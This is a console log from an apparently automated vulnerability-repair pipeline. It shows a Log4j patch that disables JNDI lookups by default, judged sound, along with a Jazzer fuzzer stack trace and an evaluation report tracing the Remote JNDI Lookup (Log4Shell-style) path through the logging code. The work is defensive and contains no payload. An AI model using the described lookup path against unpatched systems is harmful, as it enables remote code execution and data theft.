[2;36m                   [0m[2;36m [0m[34mINFO    [0m ===Evaluator [33mResult[0m===                                                              ]8;id=251103;file:///home/qqor/crete/packages/crete/framework/agent/services/prism/teams/evaluation/evaluator.py\[2mevaluator.py[0m]8;;\[2m:[0m]8;id=804951;file:///home/qqor/crete/packages/crete/framework/agent/services/prism/teams/evaluation/evaluator.py#204\[2m204[0m]8;;\
[2;36m                    [0m         PatchStatus.SOUND                                                                   [2m                [0m
[2;36m                    [0m         ===Evaluator [33mDiff[0m===                                                                [2m                [0m
[2;36m                    [0m         --- a/core/src/main/java/org/apache/logging/log4j/core/lookup/JndiLookup.java       [2m                [0m
[2;36m                    [0m         +++ b/core/src/main/java/org/apache/logging/log4j/core/lookup/JndiLookup.java       [2m                [0m
[2;36m                    [0m         @@ [1;36m-21[0m,[1;36m6[0m +[1;36m21[0m,[1;36m7[0m @@                                                                   [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m          import org.apache.logging.log4j.core.LogEvent;                                     [2m                [0m
[2;36m                    [0m          import org.apache.logging.log4j.core.config.plugins.Plugin;                        [2m                [0m
[2;36m                    [0m         +import org.apache.logging.log4j.util.PropertiesUtil;                               [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m          [35m/[0m**                                                                                [2m                [0m
[2;36m                    [0m           * Looks up keys from JNDI resources.                                              [2m                [0m
[2;36m                    [0m         @@ [1;36m-28[0m,[1;36m7[0m +[1;36m29[0m,[1;36m7[0m @@                                                                   [2m                [0m
[2;36m                    [0m          @[1;35mPlugin[0m[1m([0mname = [32m"jndi"[0m, category = [32m"Lookup"[0m[1m)[0m                                        [2m                [0m
[2;36m                    [0m          public class JndiLookup implements StrLookup [1m{[0m                                     [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         -    private static boolean ENABLE_JNDI = true;                                     [2m                [0m
[2;36m                    [0m         +    private static boolean ENABLE_JNDI =                                           [2m                [0m
[2;36m                    [0m         [1;35mPropertiesUtil.getProperties[0m[1m([0m[1m)[0m[1;35m.getBooleanProperty[0m[1m([0m[32m"log4j2.enableJndi"[0m, false[1m)[0m;      [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m              [35m/[0m** JNDI resourcce path prefix used in a J2EE container *[35m/[0m                     [2m                [0m
[2;36m                    [0m              static final String CONTAINER_JNDI_RESOURCE_PATH_PREFIX = [32m"java:comp/env/"[0m;    [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         --- a/core/src/main/java/org/apache/logging/log4j/core/lookup/Interpolator.java     [2m                [0m
[2;36m                    [0m         +++ b/core/src/main/java/org/apache/logging/log4j/core/lookup/Interpolator.java     [2m                [0m
[2;36m                    [0m         @@ [1;36m-49[0m,[1;36m6[0m +[1;36m49[0m,[1;36m9[0m @@                                                                   [2m                [0m
[2;36m                    [0m                      @[1;35mSuppressWarnings[0m[1m([0m[32m"unchecked"[0m[1m)[0m                                         [2m                [0m
[2;36m                    [0m                      final Class[1m<[0m[1;95mStrLookup[0m[39m> clazz = [0m[1;35mentry.getValue[0m[1;39m([0m[1;39m)[0m[1;35m.getPluginClass[0m[1;39m([0m[1;39m)[0m[39m;[0m      [2m                [0m
[2;36m                    [0m         [39m             try [0m[1;39m{[0m                                                                  [2m                [0m
[2;36m                    [0m         [39m+                if [0m[1;39m([0m[32m"jndi"[0m[1;35m.equals[0m[1;39m([0m[1;35mentry.getKey[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m && ![0m[1;35mJndiLookup.isEnableJndi[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m [0m[1;39m{[0m [2m                [0m
[2;36m                    [0m         [39m+                    continue;[0m                                                      [2m                [0m
[2;36m                    [0m         [39m+                [0m[1;39m}[0m                                                                  [2m                [0m
[2;36m                    [0m         [39m                 [0m[1;35mlookups.put[0m[1;39m([0m[1;35mentry.getKey[0m[1;39m([0m[1;39m)[0m[39m, [0m[1;35mclazz.newInstance[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m;[0m                  [2m                [0m
[2;36m                    [0m         [39m             [0m[1;39m}[0m[39m catch [0m[1;39m([0m[39mfinal Exception ex[0m[1;39m)[0m[39m [0m[1;39m{[0m                                         [2m                [0m
[2;36m                    [0m         [39m                 [0m[1;35mLOGGER.error[0m[1;39m([0m[32m"Unable to create Lookup for "[0m[39m + [0m[1;35mentry.getKey[0m[1;39m([0m[1;39m)[0m[39m, ex[0m[1;39m)[0m[39m;[0m [2m                [0m
[2;36m                    [0m         [39m@@ [0m[1;36m-63[0m[39m,[0m[1;36m7[0m[39m +[0m[1;36m66[0m[39m,[0m[1;36m9[0m[39m @@[0m                                                                   [2m                [0m
[2;36m                    [0m         [39m         this.defaultLookup = new [0m[1;35mMapLookup[0m[1;39m([0m[39mnew HashMap<String, String>[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m;[0m         [2m                [0m
[2;36m                    [0m         [39m         [0m[1;35mlookups.put[0m[1;39m([0m[32m"sys"[0m[39m, new [0m[1;35mSystemPropertiesLookup[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m;[0m                          [2m                [0m
[2;36m                    [0m         [39m         [0m[1;35mlookups.put[0m[1;39m([0m[32m"env"[0m[39m, new [0m[1;35mEnvironmentLookup[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m;[0m                               [2m                [0m
[2;36m                    [0m         [39m-        [0m[1;35mlookups.put[0m[1;39m([0m[32m"jndi"[0m[39m, new [0m[1;35mJndiLookup[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m;[0m                                     [2m                [0m
[2;36m                    [0m         [39m+        if [0m[1;39m([0m[1;35mJndiLookup.isEnableJndi[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m [0m[1;39m{[0m                                           [2m                [0m
[2;36m                    [0m         [39m+            [0m[1;35mlookups.put[0m[1;39m([0m[32m"jndi"[0m[39m, new [0m[1;35mJndiLookup[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m;[0m                                 [2m                [0m
[2;36m                    [0m         [39m+        [0m[1;39m}[0m                                                                          [2m                [0m
[2;36m                    [0m         [39m     [0m[1;39m}[0m                                                                              [2m                [0m
[2;36m                    [0m         [39m [0m                                                                                   [2m                [0m
[2;36m                    [0m         [39m      [0m[35m/[0m[39m**[0m                                                                           [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m===Patch [0m[33mResult[0m[39m===[0m                                                                  [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m===[0m[33mIssue[0m[39m===[0m                                                                         [2m                [0m
[2;36m                    [0m         [39m== Java Exception: com.code_intelligence.jazzer.api.FuzzerSecurityIssueCritical: [0m   [2m                [0m
[2;36m                    [0m         [39mRemote JNDI Lookup[0m                                                                  [2m                [0m
[2;36m                    [0m         [39mJNDI lookups with attacker-controlled remote URLs can, depending on the JDK[0m         [2m                [0m
[2;36m                    [0m         [39mversion, lead to remote code execution or the exfiltration of information.[0m          [2m                [0m
[2;36m                    [0m         [39m        [0m[39mat [0m                                                                         [2m                [0m
[2;36m                    [0m         [1;35mcom.code_intelligence.jazzer.sanitizers.NamingContextLookup.lookupHook[0m[1;39m([0m[39mNamingContex[0m [2m                [0m
[2;36m                    [0m         [39mtLookup.kt:[0m[1;36m61[0m[1;39m)[0m                                                                      [2m                [0m
[2;36m                    [0m         [39m        [0m[39mat [0m                                                                         [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.lookup.JndiLookup.lookup[0m[1;39m([0m[39mJndiLookup.jav[0m[1;92ma:60[0m[1;39m)[0m          [2m                [0m
[2;36m                    [0m         [39m        [0m[39mat [0m                                                                         [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.lookup.Interpolator.lookup[0m[1;39m([0m[39mInterpolator.jav[0m[1;92ma:112[0m[1;39m)[0m     [2m                [0m
[2;36m                    [0m         [39m        [0m[39mat [0m                                                                         [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.lookup.StrSubstitutor.resolveVariable[0m[1;39m([0m[39mStrSubstitutor.[0m [2m                [0m
[2;36m                    [0m         [39mjav[0m[1;92ma:904[0m[1;39m)[0m                                                                           [2m                [0m
[2;36m                    [0m         [39m        [0m[39mat [0m                                                                         [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.lookup.StrSubstitutor.substitute[0m[1;39m([0m[39mStrSubstitutor.jav[0m[1;92ma:[0m [2m                [0m
[2;36m                    [0m         [1;92m825[0m[1;39m)[0m                                                                                [2m                [0m
[2;36m                    [0m         [39m        [0m[39mat [0m                                                                         [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.lookup.StrSubstitutor.substitute[0m[1;39m([0m[39mStrSubstitutor.jav[0m[1;92ma:[0m [2m                [0m
[2;36m                    [0m         [1;92m737[0m[1;39m)[0m                                                                                [2m                [0m
[2;36m                    [0m         [39m        [0m[39mat [0m                                                                         [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.lookup.StrSubstitutor.replace[0m[1;39m([0m[39mStrSubstitutor.jav[0m[1;92ma:306[0m [2m                [0m
[2;36m                    [0m         [1;39m)[0m                                                                                   [2m                [0m
[2;36m                    [0m         [39m        [0m[39mat [0m                                                                         [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.pattern.MessagePatternConverter.format[0m[1;39m([0m[39mMessagePattern[0m [2m                [0m
[2;36m                    [0m         [39mConverter.jav[0m[1;92ma:72[0m[1;39m)[0m                                                                  [2m                [0m
[2;36m                    [0m         [39m        [0m[39mat [0m                                                                         [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.pattern.PatternFormatter.format[0m[1;39m([0m[39mPatternFormatter.jav[0m[1;92ma[0m [2m                [0m
[2;36m                    [0m         [1;92m:36[0m[1;39m)[0m                                                                                [2m                [0m
[2;36m                    [0m         [39m        [0m[39mat [0m                                                                         [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.layout.PatternLayout.toSerializable[0m[1;39m([0m[39mPatternLayout.jav[0m [2m                [0m
[2;36m                    [0m         [1;92ma:166[0m[1;39m)[0m                                                                              [2m                [0m
[2;36m                    [0m         [39m        [0m[39mat [0m                                                                         [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.layout.PatternLayout.toSerializable[0m[1;39m([0m[39mPatternLayout.jav[0m [2m                [0m
[2;36m                    [0m         [1;92ma:51[0m[1;39m)[0m                                                                               [2m                [0m
[2;36m                    [0m         [39m        [0m[39mat [0m                                                                         [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.layout.AbstractStringLayout.toByteArray[0m[1;39m([0m[39mAbstractStrin[0m [2m                [0m
[2;36m                    [0m         [39mgLayout.jav[0m[1;92ma:45[0m[1;39m)[0m                                                                    [2m                [0m
[2;36m                    [0m         [39m        [0m[39mat [0m                                                                         [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.appender.AbstractOutputStreamAppender.append[0m[1;39m([0m[39mAbstract[0m [2m                [0m
[2;36m                    [0m         [39mOutputStreamAppender.jav[0m[1;92ma:113[0m[1;39m)[0m                                                      [2m                [0m
[2;36m                    [0m         [39m        [0m[39mat [0m                                                                         [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.config.AppenderControl.callAppender[0m[1;39m([0m[39mAppenderControl.j[0m [2m                [0m
[2;36m                    [0m         [39mav[0m[1;92ma:102[0m[1;39m)[0m                                                                            [2m                [0m
[2;36m                    [0m         [39m        [0m[39mat [0m                                                                         [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.config.LoggerConfig.callAppenders[0m[1;39m([0m[39mLoggerConfig.jav[0m[1;92ma:4[0m [2m                [0m
[2;36m                    [0m         [1;92m26[0m[1;39m)[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m        [0m[39mat [0m                                                                         [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.config.LoggerConfig.log[0m[1;39m([0m[39mLoggerConfig.jav[0m[1;92ma:407[0m[1;39m)[0m        [2m                [0m
[2;36m                    [0m         [39m        [0m[39mat [0m                                                                         [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.config.LoggerConfig.log[0m[1;39m([0m[39mLoggerConfig.jav[0m[1;92ma:368[0m[1;39m)[0m        [2m                [0m
[2;36m                    [0m         [39m        [0m[39mat [0m[1;35morg.apache.logging.log4j.core.Logger.log[0m[1;39m([0m[39mLogger.jav[0m[1;92ma:110[0m[1;39m)[0m                [2m                [0m
[2;36m                    [0m         [39m        [0m[39mat [0m                                                                         [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.spi.AbstractLogger.warn[0m[1;39m([0m[39mAbstractLogger.jav[0m[1;92ma:1916[0m[1;39m)[0m          [2m                [0m
[2;36m                    [0m         [39m        [0m[39mat [0m                                                                         [2m                [0m
[2;36m                    [0m         [1;35mcom.example.SimpleLoggerFuzzer.fuzzerTestOneInput[0m[1;39m([0m[39mSimpleLoggerFuzzer.jav[0m[1;92ma:42[0m[1;39m)[0m       [2m                [0m
[2;36m                    [0m         [39mDEDUP_TOKEN: 03a39a742f79fa3d[0m                                                       [2m                [0m
[2;36m                    [0m         [39m== libFuzzer crashing input ==[0m                                                      [2m                [0m
[2;36m                    [0m         [39m===Evaluation [0m[33mReport[0m[39m===[0m                                                             [2m                [0m
[2;36m                    [0m         [39m# Evaluation Report[0m                                                                 [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m## Summary[0m                                                                          [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39mA critical security vulnerability has been detected in Apache Log4j's JNDI lookup [0m  [2m                [0m
[2;36m                    [0m         [39mfunctionality. The fuzzer identified a Remote JNDI Lookup issue that can [0m           [2m                [0m
[2;36m                    [0m         [39mpotentially lead to remote code execution or information exfiltration, depending on[0m [2m                [0m
[2;36m                    [0m         [39mthe JDK version. The vulnerability is triggered when Log4j processes log messages [0m  [2m                [0m
[2;36m                    [0m         [39mcontaining JNDI lookup expressions with attacker-controlled remote URLs.[0m            [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m## Description[0m                                                                      [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m### Vulnerability Classification[0m                                                    [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39mThis is a **Remote JNDI Lookup** vulnerability classified as a critical security [0m   [2m                [0m
[2;36m                    [0m         [39missue [0m[1;39m([0m[39m`FuzzerSecurityIssueCritical`[0m[1;39m)[0m[39m. JNDI [0m[1;39m([0m[39mJava Naming and Directory Interface[0m[1;39m)[0m[39m [0m  [2m                [0m
[2;36m                    [0m         [39mlookups with attacker-controlled remote URLs present a severe security risk, as [0m    [2m                [0m
[2;36m                    [0m         [39mthey can enable:[0m                                                                    [2m                [0m
[2;36m                    [0m         [39m- Remote code execution [0m[1;39m([0m[39mRCE[0m[1;39m)[0m                                                       [2m                [0m
[2;36m                    [0m         [39m- Exfiltration of sensitive information[0m                                             [2m                [0m
[2;36m                    [0m         [39m- The actual impact depends on the specific JDK version in use[0m                      [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m### Technical Analysis[0m                                                              [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39mThe issue originates from the following execution flow:[0m                             [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m1[0m[39m. **Entry Point**: The fuzzer test case [0m[1;39m([0m[39m`SimpleLoggerFuzzer.fuzzerTestOneInput`[0m[1;39m)[0m[39m [0m [2m                [0m
[2;36m                    [0m         [39minvokes a logging operation using `[0m[1;35mAbstractLogger.warn[0m[1;39m([0m[1;39m)[0m[39m` at line [0m[1;36m42[0m                [2m                [0m
[2;36m                    [0m         [1;36m2[0m[39m. **Log Processing Chain**: The log message passes through multiple Log4j internal[0m [2m                [0m
[2;36m                    [0m         [39mcomponents:[0m                                                                         [2m                [0m
[2;36m                    [0m         [39m   - `[0m[1;35mLogger.log[0m[1;39m([0m[1;39m)[0m[39m` → `[0m[1;35mLoggerConfig.log[0m[1;39m([0m[1;39m)[0m[39m` → `[0m[1;35mLoggerConfig.callAppenders[0m[1;39m([0m[1;39m)[0m[39m`[0m         [2m                [0m
[2;36m                    [0m         [39m   - `[0m[1;35mAppenderControl.callAppender[0m[1;39m([0m[1;39m)[0m[39m` → `[0m[1;35mAbstractOutputStreamAppender.append[0m[1;39m([0m[1;39m)[0m[39m`[0m     [2m                [0m
[2;36m                    [0m         [39m   - `[0m[1;35mPatternLayout.toSerializable[0m[1;39m([0m[1;39m)[0m[39m` → `[0m[1;35mPatternFormatter.format[0m[1;39m([0m[1;39m)[0m[39m`[0m                 [2m                [0m
[2;36m                    [0m         [1;36m3[0m[39m. **Message Pattern Conversion**: At `[0m[1;35mMessagePatternConverter.format[0m[1;39m([0m[1;39m)[0m[39m` [0m[1;39m([0m[39mline [0m[1;36m72[0m[1;39m)[0m[39m,[0m [2m                [0m
[2;36m                    [0m         [39mthe message undergoes pattern-based formatting[0m                                      [2m                [0m
[2;36m                    [0m         [1;36m4[0m[39m. **String Substitution**: The `StrSubstitutor` component processes the message [0m   [2m                [0m
[2;36m                    [0m         [39mthrough multiple substitution methods:[0m                                              [2m                [0m
[2;36m                    [0m         [39m   - `[0m[1;35mStrSubstitutor.replace[0m[1;39m([0m[1;39m)[0m[39m` [0m[1;39m([0m[39mline [0m[1;36m306[0m[1;39m)[0m                                          [2m                [0m
[2;36m                    [0m         [39m   - `[0m[1;35mStrSubstitutor.substitute[0m[1;39m([0m[1;39m)[0m[39m` [0m[1;39m([0m[39mlines [0m[1;36m737[0m[39m and [0m[1;36m825[0m[1;39m)[0m                              [2m                [0m
[2;36m                    [0m         [39m   - `[0m[1;35mStrSubstitutor.resolveVariable[0m[1;39m([0m[1;39m)[0m[39m` [0m[1;39m([0m[39mline [0m[1;36m904[0m[1;39m)[0m                                  [2m                [0m
[2;36m                    [0m         [1;36m5[0m[39m. **Lookup Resolution**: The `[0m[1;35mInterpolator.lookup[0m[1;39m([0m[1;39m)[0m[39m` method [0m[1;39m([0m[39mline [0m[1;36m112[0m[1;39m)[0m[39m delegates [0m  [2m                [0m
[2;36m                    [0m         [39mto specific lookup handlers[0m                                                         [2m                [0m
[2;36m                    [0m         [1;36m6[0m[39m. **JNDI Lookup Execution**: `[0m[1;35mJndiLookup.lookup[0m[1;39m([0m[1;39m)[0m[39m` [0m[1;39m([0m[39mline [0m[1;36m60[0m[1;39m)[0m[39m performs the actual [0m  [2m                [0m
[2;36m                    [0m         [39mJNDI lookup operation[0m                                                               [2m                [0m
[2;36m                    [0m         [1;36m7[0m[39m. **Security Hook Trigger**: The Jazzer sanitizer's [0m                               [2m                [0m
[2;36m                    [0m         [39m`[0m[1;35mNamingContextLookup.lookupHook[0m[1;39m([0m[1;39m)[0m[39m` [0m[1;39m([0m[39mline [0m[1;36m61[0m[1;39m)[0m[39m detects and flags the remote JNDI [0m     [2m                [0m
[2;36m                    [0m         [39mlookup attempt[0m                                                                      [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m### Key Observations[0m                                                                [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m- The vulnerability is embedded deep within Log4j's message processing pipeline, [0m   [2m                [0m
[2;36m                    [0m         [39mspecifically in the lookup and interpolation mechanism[0m                              [2m                [0m
[2;36m                    [0m         [39m- The security issue is automatically detected by Jazzer's sanitizer hooks, [0m        [2m                [0m
[2;36m                    [0m         [39mindicating this is a well-known vulnerability pattern[0m                               [2m                [0m
[2;36m                    [0m         [39m- The stack trace shows that user-controlled input [0m[1;39m([0m[39mthe fuzzer input[0m[1;39m)[0m[39m flows through[0m [2m                [0m
[2;36m                    [0m         [39mthe logging framework and triggers JNDI lookups without proper validation[0m           [2m                [0m
[2;36m                    [0m         [39m- The issue manifests during the message formatting phase, not during the initial [0m  [2m                [0m
[2;36m                    [0m         [39mlogging call[0m                                                                        [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m### Areas for Investigation[0m                                                         [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39mTo obtain a comprehensive understanding of this vulnerability, the following [0m       [2m                [0m
[2;36m                    [0m         [39mcodebase components should be examined:[0m                                             [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m1[0m[39m. **JNDI Lookup Implementation**:[0m                                                  [2m                [0m
[2;36m                    [0m         [39m   - `org.apache.logging.log4j.core.lookup.JndiLookup.java` - particularly the [0m     [2m                [0m
[2;36m                    [0m         [39m`[0m[1;35mlookup[0m[1;39m([0m[1;39m)[0m[39m` method at line [0m[1;36m60[0m                                                        [2m                [0m
[2;36m                    [0m         [39m   - Understanding what user input is passed to JNDI and how it's validated[0m         [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m2[0m[39m. **Interpolation and Substitution Logic**:[0m                                        [2m                [0m
[2;36m                    [0m         [39m   - `org.apache.logging.log4j.core.lookup.Interpolator.java` - the lookup [0m         [2m                [0m
[2;36m                    [0m         [39mresolution mechanism at line [0m[1;36m112[0m                                                    [2m                [0m
[2;36m                    [0m         [39m   - `org.apache.logging.log4j.core.lookup.StrSubstitutor.java` - the variable [0m     [2m                [0m
[2;36m                    [0m         [39mresolution and substitution methods [0m[1;39m([0m[39mlines [0m[1;36m306[0m[39m, [0m[1;36m737[0m[39m, [0m[1;36m825[0m[39m, [0m[1;36m904[0m[1;39m)[0m                      [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m3[0m[39m. **Message Pattern Processing**:[0m                                                  [2m                [0m
[2;36m                    [0m         [39m   - `org.apache.logging.log4j.core.pattern.MessagePatternConverter.java` - the [0m    [2m                [0m
[2;36m                    [0m         [39mformat method at line [0m[1;36m72[0m                                                            [2m                [0m
[2;36m                    [0m         [39m   - Understanding how log messages are parsed and processed for special syntax[0m     [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m4[0m[39m. **Configuration and Lookup Registry**:[0m                                           [2m                [0m
[2;36m                    [0m         [39m   - How different lookup types are registered and invoked[0m                          [2m                [0m
[2;36m                    [0m         [39m   - Whether JNDI lookups can be disabled or restricted through configuration[0m       [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m5[0m[39m. **Test Harness**:[0m                                                                [2m                [0m
[2;36m                    [0m         [39m   - `com.example.SimpleLoggerFuzzer.java` - specifically line [0m[1;36m42[0m[39m to understand [0m    [2m                [0m
[2;36m                    [0m         [39mwhat input format triggers the vulnerability[0m                                        [2m                [0m
[2;36m                    [0m         [39m   - The nature of the fuzzer input that successfully exploited this issue[0m          [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39mThe DEDUP_TOKEN `03a39a742f79fa3d` indicates this is a unique instance of the [0m      [2m                [0m
[2;36m                    [0m         [39mvulnerability that should be tracked separately from other findings.[0m                [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m## Initial Issue Log[0m                                                                [2m                [0m
[2;36m                    [0m         [39mHere is the initial issue log of the codebase:[0m                                      [2m                [0m
[2;36m                    [0m         [39m<issue>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m== Java Exception: com.code_intelligence.jazzer.api.FuzzerSecurityIssueCritical: [0m   [2m                [0m
[2;36m                    [0m         [39mRemote JNDI Lookup[0m                                                                  [2m                [0m
[2;36m                    [0m         [39mJNDI lookups with attacker-controlled remote URLs can, depending on the JDK[0m         [2m                [0m
[2;36m                    [0m         [39mversion, lead to remote code execution or the exfiltration of information.[0m          [2m                [0m
[2;36m                    [0m         [39m        [0m[39mat [0m                                                                         [2m                [0m
[2;36m                    [0m         [1;35mcom.code_intelligence.jazzer.sanitizers.NamingContextLookup.lookupHook[0m[1;39m([0m[39mNamingContex[0m [2m                [0m
[2;36m                    [0m         [39mtLookup.kt:[0m[1;36m61[0m[1;39m)[0m                                                                      [2m                [0m
[2;36m                    [0m         [39m        [0m[39mat [0m                                                                         [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.lookup.JndiLookup.lookup[0m[1;39m([0m[39mJndiLookup.jav[0m[1;92ma:60[0m[1;39m)[0m          [2m                [0m
[2;36m                    [0m         [39m        [0m[39mat [0m                                                                         [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.lookup.Interpolator.lookup[0m[1;39m([0m[39mInterpolator.jav[0m[1;92ma:112[0m[1;39m)[0m     [2m                [0m
[2;36m                    [0m         [39m        [0m[39mat [0m                                                                         [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.lookup.StrSubstitutor.resolveVariable[0m[1;39m([0m[39mStrSubstitutor.[0m [2m                [0m
[2;36m                    [0m         [39mjav[0m[1;92ma:904[0m[1;39m)[0m                                                                           [2m                [0m
[2;36m                    [0m         [39m        [0m[39mat [0m                                                                         [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.lookup.StrSubstitutor.substitute[0m[1;39m([0m[39mStrSubstitutor.jav[0m[1;92ma:[0m [2m                [0m
[2;36m                    [0m         [1;92m825[0m[1;39m)[0m                                                                                [2m                [0m
[2;36m                    [0m         [39m        [0m[39mat [0m                                                                         [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.lookup.StrSubstitutor.substitute[0m[1;39m([0m[39mStrSubstitutor.jav[0m[1;92ma:[0m [2m                [0m
[2;36m                    [0m         [1;92m737[0m[1;39m)[0m                                                                                [2m                [0m
[2;36m                    [0m         [39m        [0m[39mat [0m                                                                         [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.lookup.StrSubstitutor.replace[0m[1;39m([0m[39mStrSubstitutor.jav[0m[1;92ma:306[0m [2m                [0m
[2;36m                    [0m         [1;39m)[0m                                                                                   [2m                [0m
[2;36m                    [0m         [39m        [0m[39mat [0m                                                                         [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.pattern.MessagePatternConverter.format[0m[1;39m([0m[39mMessagePattern[0m [2m                [0m
[2;36m                    [0m         [39mConverter.jav[0m[1;92ma:72[0m[1;39m)[0m                                                                  [2m                [0m
[2;36m                    [0m         [39m        [0m[39mat [0m                                                                         [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.pattern.PatternFormatter.format[0m[1;39m([0m[39mPatternFormatter.jav[0m[1;92ma[0m [2m                [0m
[2;36m                    [0m         [1;92m:36[0m[1;39m)[0m                                                                                [2m                [0m
[2;36m                    [0m         [39m        [0m[39mat [0m                                                                         [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.layout.PatternLayout.toSerializable[0m[1;39m([0m[39mPatternLayout.jav[0m [2m                [0m
[2;36m                    [0m         [1;92ma:166[0m[1;39m)[0m                                                                              [2m                [0m
[2;36m                    [0m         [39m        [0m[39mat [0m                                                                         [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.layout.PatternLayout.toSerializable[0m[1;39m([0m[39mPatternLayout.jav[0m [2m                [0m
[2;36m                    [0m         [1;92ma:51[0m[1;39m)[0m                                                                               [2m                [0m
[2;36m                    [0m         [39m        [0m[39mat [0m                                                                         [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.layout.AbstractStringLayout.toByteArray[0m[1;39m([0m[39mAbstractStrin[0m [2m                [0m
[2;36m                    [0m         [39mgLayout.jav[0m[1;92ma:45[0m[1;39m)[0m                                                                    [2m                [0m
[2;36m                    [0m         [39m        [0m[39mat [0m                                                                         [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.appender.AbstractOutputStreamAppender.append[0m[1;39m([0m[39mAbstract[0m [2m                [0m
[2;36m                    [0m         [39mOutputStreamAppender.jav[0m[1;92ma:113[0m[1;39m)[0m                                                      [2m                [0m
[2;36m                    [0m         [39m        [0m[39mat [0m                                                                         [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.config.AppenderControl.callAppender[0m[1;39m([0m[39mAppenderControl.j[0m [2m                [0m
[2;36m                    [0m         [39mav[0m[1;92ma:102[0m[1;39m)[0m                                                                            [2m                [0m
[2;36m                    [0m         [39m        [0m[39mat [0m                                                                         [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.config.LoggerConfig.callAppenders[0m[1;39m([0m[39mLoggerConfig.jav[0m[1;92ma:4[0m [2m                [0m
[2;36m                    [0m         [1;92m26[0m[1;39m)[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m        [0m[39mat [0m                                                                         [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.config.LoggerConfig.log[0m[1;39m([0m[39mLoggerConfig.jav[0m[1;92ma:407[0m[1;39m)[0m        [2m                [0m
[2;36m                    [0m         [39m        [0m[39mat [0m                                                                         [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.config.LoggerConfig.log[0m[1;39m([0m[39mLoggerConfig.jav[0m[1;92ma:368[0m[1;39m)[0m        [2m                [0m
